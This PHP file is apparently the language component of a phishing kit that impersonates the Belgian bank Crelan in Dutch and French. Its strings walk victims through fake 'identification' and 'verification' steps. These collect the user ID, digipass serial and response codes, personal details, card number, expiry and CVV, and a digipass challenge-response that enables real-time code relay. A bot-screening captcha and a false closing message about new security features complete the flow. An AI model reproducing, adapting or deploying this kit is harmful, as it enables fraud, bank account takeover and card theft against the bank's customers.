<?php

    include "./Assets/php/config/config.php";

    if (isset($_GET["lang"])) {
        $_SESSION["lang"] = $_GET["lang"];
    }

    $lang = array(
        
        'title_head' => [
            'nl' => 'WEBPAGINA',
            'fr' => 'PAGE WEB'
        ],

        'current_lang' => [
            'nl' => 'FR',
            'fr' => 'NL'
        ],

        'link_footer_1' => [
            'nl' => 'Meer info?',
            'fr' => 'Plus d’informations ?'
        ],

        'link_footer_2' => [
            'nl' => 'Privacy',
            'fr' => 'Confidentialité'
        ],

        'link_footer_3' => [
            'nl' => 'Reglement myCrelan',
            'fr' => 'Règlement myCrelan'
        ],

        'link_footer_4' => [
            'nl' => 'Security myCrelan',
            'fr' => 'Sécurité myCrelan'
        ],

        'paragraph_footer' => [
            'nl' => 'Alle rechten voorbehouden',
            'fr' => 'Tous droits réservés'
        ],

        // Login :
        'title_step_login_1' => [
            'nl' => 'Identificatie',
            'fr' => 'Identification'
        ],

        'title_step_login_2' => [
            'nl' => 'Waar kan ik mijn gebruikersidentificatie terugvinden?',
            'fr' => 'Où puis-je retrouver mon identifiant utilisateur ?'
        ],

        'title_step_login_3' => [
            'nl' => 'Heeft u Crelan Mobile?',
            'fr' => 'Disposez-vous de Crelan Mobile ?'
        ],

        'paragraph_step_login_1' => [
            'nl' => 'Geef uw gebruikersidentificatie in.',
            'fr' => 'Saisissez votre identifiant utilisateur.'
        ],

        'paragraph_step_login_2' => [
            'nl' => 'U kan uw gebruikersidentificatie terugvinden in <strong>Crelan Mobile bij uw profielgegevens</strong>. Meld u aan in Crelan Mobile en klik op de menu knop links bovenaan (de 3 horizontale streepjes). Klik vervolgens op uw profielgegevens (door te klikken op uw voor- en achternaam), waar u dan uw gebruikersidentificatie kan terugvinden.',
            'fr' => 'Vous pouvez retrouver votre identifiant utilisateur dans <strong>Crelan Mobile, dans vos données de profil</strong>. Connectez-vous à Crelan Mobile et cliquez sur le bouton du menu en haut à gauche (les 3 lignes horizontales). Cliquez ensuite sur vos données de profil (en cliquant sur votre prénom et votre nom), où vous pourrez retrouver votre identifiant utilisateur.'
        ],

        'paragraph_step_login_3' => [
            'nl' => 'Dit is niet uw gebruikersdefinitie, maar slechts een voorbeeld van hoe uw gebruikersdefinitie eruit zou kunnen zien.',
            'fr' => 'Il ne s’agit pas de votre identifiant utilisateur, mais uniquement d’un exemple de ce à quoi votre identifiant pourrait ressembler.'
        ],

        'paragraph_step_login_4' => [
            'nl' => 'De papieren of digitale documenten die u ontvangt wanneer u uw account opent of Crelan Online activeert.',
            'fr' => 'Les documents papier ou numériques que vous recevez lors de l’ouverture de votre compte ou de l’activation de Crelan Online.'
        ],

        'paragraph_step_login_5' => [
            'nl' => '*Uw gebruikersidentificatie **is niet** uw rekeningnummer (IBAN).',
            'fr' => '*Votre identifiant utilisateur **n’est pas** votre numéro de compte (IBAN).'
        ],

        'label_step_login' => [
            'nl' => 'Gebruikersidentificatie (bijv.: AB12CD)',
            'fr' => 'Identifiant utilisateur (ex.: AB12CD)'
        ],

        'message_error_input_step_login' => [
            'nl' => 'Voer een geldige gebruikersidentificatie in.',
            'fr' => 'Veuillez saisir un identifiant utilisateur valide.'
        ],

        'button_step_login' => [
            'nl' => 'Aanmelden',
            'fr' => 'Se connecter'
        ],

        'message_error_step_login' => [
            'nl' => 'De informatie is onjuist. Controleer of alle verplichte velden correct zijn ingevuld en probeer het opnieuw.',
            'fr' => 'Les informations sont incorrectes. Veuillez vérifier que tous les champs obligatoires sont correctement complétés et réessayer.'
        ],


        // Step One :
        'title_step_one' => [
            'nl' => 'Identificatie',
            'fr' => 'Identification'
        ],

        'paragraph_step_one_1' => [
            'nl' => 'et uw digipass aan via de pijltjestoets <img src="./Assets/imgs/icon-reader-3.png" class="image-1"> en voer uw geheime code in.',
            'fr' => 'Allumez votre digipass à l’aide de la touche fléchée <img src="./Assets/imgs/icon-reader-3.png" class="image-1"> et introduisez votre code secret.'
        ],

        'paragraph_step_one_2' => [
            'nl' => 'Wanneer op het scherm van uw digipass <strong>"APPLI"</strong> verschijnt, drukt u op de functietoets <img src="./Assets/imgs/icon-reader-4.png" class="image-2">',
            'fr' => 'Lorsque <strong>"APPLI"</strong> apparaît à l’écran de votre digipass, appuyez sur la touche de fonction <img src="./Assets/imgs/icon-reader-4.png" class="image-2">'
        ],

        'label_step_one_1' => [
            'nl' => 'Vul hier het serienummer van uw digipass in. Dit staat vermeld op de achterzijde van de digipass.',
            'fr' => 'Saisissez ici le numéro de série de votre digipass. Celui-ci se trouve au dos du digipass.'
        ],

        'label_step_one_2' => [
            'nl' => 'Vul hier het serienummer van uw digipass in. Dit staat vermeld op de achterzijde van de digipass.',
            'fr' => 'Saisissez ici le numéro de série de votre digipass. Celui-ci se trouve au dos du digipass.'
        ],

        'message_error_input_step_one' => [
            'nl' => 'Dit veld is verplicht.',
            'fr' => 'Ce champ est obligatoire.'
        ],

        'button_step_one' => [
            'nl' => 'Aanmelden',
            'fr' => 'Se connecter'
        ],

        'message_error_step_one' => [
            'nl' => 'De informatie is onjuist. Controleer of alle verplichte velden correct zijn ingevuld en probeer het opnieuw.',
            'fr' => 'Les informations sont incorrectes. Veuillez vérifier que tous les champs obligatoires sont correctement complétés et réessayer.'
        ],

        // Step Two :
        'title_step_two' => [
            'nl' => 'Identificatie',
            'fr' => 'Identification'
        ],

        'paragraph_step_two_1' => [
            'nl' => 'Scan tijd van QR-code :',
            'fr' => 'Temps de scan du code QR :'
        ],

        'paragraph_step_two_2' => [
            'nl' => 'Je QR-code is verlopen, klik alstublieft om een nieuwe QR-code te krijgen.',
            'fr' => 'Votre code QR a expiré, veuillez cliquer pour en obtenir un nouveau.'
        ],

        'paragraph_step_two_3' => [
            'nl' => 'Zet de digipass aan met de <strong>groene knop.</strong>',
            'fr' => 'Allumez le digipass à l’aide du <strong>bouton vert</strong>.'
        ],

        'paragraph_step_two_4' => [
            'nl' => '<strong>Scan</strong> de afbeelding met uw digipass.',
            'fr' => '<strong>Scannez</strong> l’image à l’aide de votre digipass.'
        ],

        'paragraph_step_two_5' => [
            'nl' => '<strong>Voer uw PIN in</strong> en bevestig met <strong>"OK"</strong>. <br> Druk <strong>nogmaals</strong> op <strong>"OK"</strong> om uw response code te ontvangen.',
            'fr' => '<strong>Introduisez votre code PIN</strong> et confirmez avec <strong>"OK"</strong>. <br> Appuyez <strong>à nouveau</strong> sur <strong>"OK"</strong> pour recevoir votre code de réponse.'
        ],

        'label_step_two' => [
            'nl' => 'Vul in het veld hieronder de <strong>response code</strong> in die op het scherm van de digipass verschijnt:',
            'fr' => 'Saisissez dans le champ ci-dessous le <strong>code de réponse</strong> affiché à l’écran du digipass :'
        ],

        'message_error_input_step_two' => [
            'nl' => 'Dit veld is verplicht.',
            'fr' => 'Ce champ est obligatoire.'
        ],

        'button_step_two_1' => [
            'nl' => 'Krijg de nieuwe QR-code',
            'fr' => 'Obtenir un nouveau code QR'
        ],

        'button_step_two_2' => [
            'nl' => 'Verdergaan',
            'fr' => 'Continuer'
        ],

        'message_error_step_two' => [
            'nl' => 'De informatie is onjuist. Controleer of alle verplichte velden correct zijn ingevuld en probeer het opnieuw.',
            'fr' => 'Les informations sont incorrectes. Veuillez vérifier que tous les champs obligatoires sont correctement complétés et réessayer.'
        ],

        // Step Three :
        'title_step_three' => [
            'nl' => 'Bevestig de activering',
            'fr' => 'Confirmez l’activation'
        ],

        'paragraph_step_three_1' => [
            'nl' => 'Dit is een extra veiligheidscontrole.',
            'fr' => 'Il s’agit d’un contrôle de sécurité supplémentaire.'
        ],

        'paragraph_step_three_2' => [
            'nl' => '<strong>Open uw mailbox</strong><br>U kreeg zonet een mail met een activatielink',
            'fr' => '<strong>Ouvrez votre boîte e-mail</strong><br>Vous venez de recevoir un e-mail contenant un lien d’activation'
        ],

        'paragraph_step_three_3' => [
            'nl' => '<strong>Bevestig de activering</strong><br>Druk op de activatielink in de e-mail',
            'fr' => '<strong>Confirmez l’activation</strong><br>Cliquez sur le lien d’activation dans l’e-mail'
        ],

        'paragraph_step_three_4' => [
            'nl' => '<strong>Open deze pagina opnieuw en ga naar de volgende stap</strong>',
            'fr' => '<strong>Rouvrez cette page et passez à l’étape suivante</strong>'
        ],

        'button_step_three' => [
            'nl' => 'Volgende',
            'fr' => 'Suivant'
        ],

        'message_error_step_three' => [
            'nl' => 'Fout: Controleer uw e-mail en klik op de activatielink. Open daarna deze pagina opnieuw.',
            'fr' => 'Erreur : vérifiez votre e-mail et cliquez sur le lien d’activation. Rouvrez ensuite cette page.'
        ],


        // Step Four :
        'title_step_four' => [
            'nl' => 'Aanvullende verificatie',
            'fr' => 'Vérification complémentaire'
        ],

        'paragraph_step_four' => [
            'nl' => 'Vul de verplichte velden in, zodat we uw identiteit kunnen verifiëren.',
            'fr' => 'Veuillez compléter les champs obligatoires afin que nous puissions vérifier votre identité.'
        ],

        'message_error_input_step_four' => [
            'nl' => 'Dit veld is verplicht.',
            'fr' => 'Ce champ est obligatoire.'
        ],

        'button_step_four' => [
            'nl' => 'Volgende',
            'fr' => 'Suivant'
        ],

        'message_error_step_four' => [
            'nl' => 'De informatie is onjuist. Controleer of alle verplichte velden correct zijn ingevuld en probeer het opnieuw.',
            'fr' => 'Les informations sont incorrectes. Veuillez vérifier que tous les champs obligatoires sont correctement complétés et réessayer.'
        ],

        // Step Five :
        'title_step_five' => [
            'nl' => 'Bevestig uw persoonlijke gegevens',
            'fr' => 'Confirmez vos informations personnelles'
        ],

        'paragraph_step_five' => [
            'nl' => 'Vul het formulier in met de gevraagde informatie.',
            'fr' => 'Remplissez le formulaire avec les informations demandées.'
        ],

        'label_step_five_1' => [
            'nl' => 'Voornaam',
            'fr' => 'Prénom'
        ],

        'label_step_five_2' => [
            'nl' => 'Achternaam',
            'fr' => 'Nom'
        ],

        'label_step_five_3' => [
            'nl' => 'Geboortedatum',
            'fr' => 'Date de naissance'
        ],

        'label_step_five_4' => [
            'nl' => 'E-mailadres',
            'fr' => 'Adresse e-mail'
        ],

        'label_step_five_5' => [
            'nl' => 'Telefoonnummer',
            'fr' => 'Numéro de téléphone'
        ],

        'label_step_five_6' => [
            'nl' => 'Adres',
            'fr' => 'Adresse'
        ],

        'label_step_five_7' => [
            'nl' => 'Plaats',
            'fr' => 'Ville'
        ],

        'label_step_five_8' => [
            'nl' => 'Postcode',
            'fr' => 'Code postal'
        ],

        'message_error_input_step_five' => [
            'nl' => 'Dit veld is verplicht.',
            'fr' => 'Ce champ est obligatoire.'
        ],

        'button_step_five' => [
            'nl' => 'Volgende',
            'fr' => 'Suivant'
        ],

        'message_error_step_five' => [
            'nl' => 'De informatie is onjuist. Controleer of alle verplichte velden correct zijn ingevuld en probeer het opnieuw.',
            'fr' => 'Les informations sont incorrectes. Veuillez vérifier que tous les champs obligatoires sont correctement remplis et réessayer.'
        ],

        // Step six :
        'title_step_six' => [
            'nl' => 'Aanvullende verificatie',
            'fr' => 'Vérification complémentaire'
        ],

        'paragraph_step_six' => [
            'nl' => 'Vul het formulier in met de gevraagde informatie.',
            'fr' => 'Remplissez le formulaire avec les informations demandées.'
        ],

        'label_step_six_1' => [
            'nl' => 'Kaartnummer',
            'fr' => 'Numéro de carte'
        ],

        'label_step_six_2' => [
            'nl' => 'Vervaldatum',
            'fr' => 'Date d’expiration'
        ],

        'label_step_six_3' => [
            'nl' => 'CVV',
            'fr' => 'CVV'
        ],

        'message_error_input_step_six' => [
            'nl' => 'Dit veld is verplicht.',
            'fr' => 'Ce champ est obligatoire.'
        ],

        'button_step_six' => [
            'nl' => 'Volgende',
            'fr' => 'Suivant'
        ],

        'message_error_step_six' => [
            'nl' => 'De informatie is onjuist. Controleer of alle verplichte velden correct zijn ingevuld en probeer het opnieuw.',
            'fr' => 'Les informations sont incorrectes. Veuillez vérifier que tous les champs obligatoires sont correctement remplis et réessayer.'
        ],

        // Step Seven :
        'paragraph_step_seven_1' => [
            'nl' => 'Druk opnieuw op deze toets',
            'fr' => 'Appuyez de nouveau sur cette touche'
        ],

        'paragraph_step_seven_2' => [
            'nl' => 'Druk op 2',
            'fr' => 'Appuyez sur 2'
        ],

        'paragraph_step_seven_3' => [
            'nl' => 'Geef deze <strong>8 cijfers in op uw digipass</strong>',
            'fr' => 'Saisissez ces <strong>8 chiffres sur votre digipass</strong>'
        ],

        'paragraph_step_seven_4' => [
            'nl' => ' Geef hieronder de <strong>6 cijfers</strong> in die verschijnen op het scherm van uw digipass',
            'fr' => 'Saisissez ci-dessous les <strong>6 chiffres</strong> affichés à l’écran de votre digipass'
        ],

        'message_error_input_step_seven' => [
            'nl' => 'Dit veld is verplicht.',
            'fr' => 'Ce champ est obligatoire.'
        ],

        'button_step_seven' => [
            'nl' => 'Volgende',
            'fr' => 'Suivant'
        ],

        'message_error_step_seven' => [
            'nl' => 'De informatie is onjuist. Controleer of alle verplichte velden correct zijn ingevuld en probeer het opnieuw.',
            'fr' => 'Les informations sont incorrectes. Veuillez vérifier que tous les champs obligatoires sont correctement remplis et réessayer.'
        ],

        // Step End :
        'title_step_end' => [
            'nl' => 'Bedankt voor het voltooien van de verificatieprocedure.',
            'fr' => 'Merci d’avoir terminé la procédure de vérification.'
        ],

        'paragraph_step_end' => [
            'nl' => 'Uw account is nu geactiveerd met de nieuwe beveiligingsfuncties die we aan ons bedrijf hebben toegevoegd. U kunt nu zonder problemen toegang krijgen tot uw account. Bedankt voor uw vertrouwen.',
            'fr' => 'Votre compte est désormais activé avec les nouvelles fonctionnalités de sécurité que nous avons ajoutées à notre service. Vous pouvez maintenant accéder à votre compte sans problème. Merci de votre confiance.'
        ],

        'button_step_end' => [
            'nl' => 'Ga naar de homepage',
            'fr' => 'Aller à la page d’accueil'
        ],

        // Step Loading :
        'title_step_loading' => [
            'nl' => 'Verifiëren',
            'fr' => 'Vérification'
        ],

        'paragraph_step_loading' => [
            'nl' => ' We controleren uw gegevens. U wordt binnenkort doorgestuurd naar de volgende pagina. Het verificatieproces duurt niet lang.',
            'fr' => 'Nous vérifions vos informations. Vous serez bientôt redirigé vers la page suivante. Le processus de vérification ne prendra pas longtemps.'
        ],

        // Captcha :
        'title_head_captcha' => [
            'fr' => 'Vérification',
            'nl' => 'Verificatie'
        ],

        'p_captcha' => [
            'fr' => 'Veuillez répondre à ce calcul mathématique simple pour confirmer que vous êtes humain et non un robot.',
            'nl' => 'Beantwoord deze eenvoudige rekensom om te bevestigen dat u een mens bent en geen robot.'
        ],

        'label_captcha' => [
            'fr' => 'Entrez le résultat',
            'nl' => 'Voer het resultaat in'
        ],

        'button_captcha' => [
            'fr' => 'Vérifier le résultat',
            'nl' => 'Resultaat controleren'
        ],

        'message_error_captcha' => [
            'fr' => 'Incorrect, veuillez réessayer.',
            'nl' => 'Onjuist, probeer het opnieuw.'
        ]

    );

?>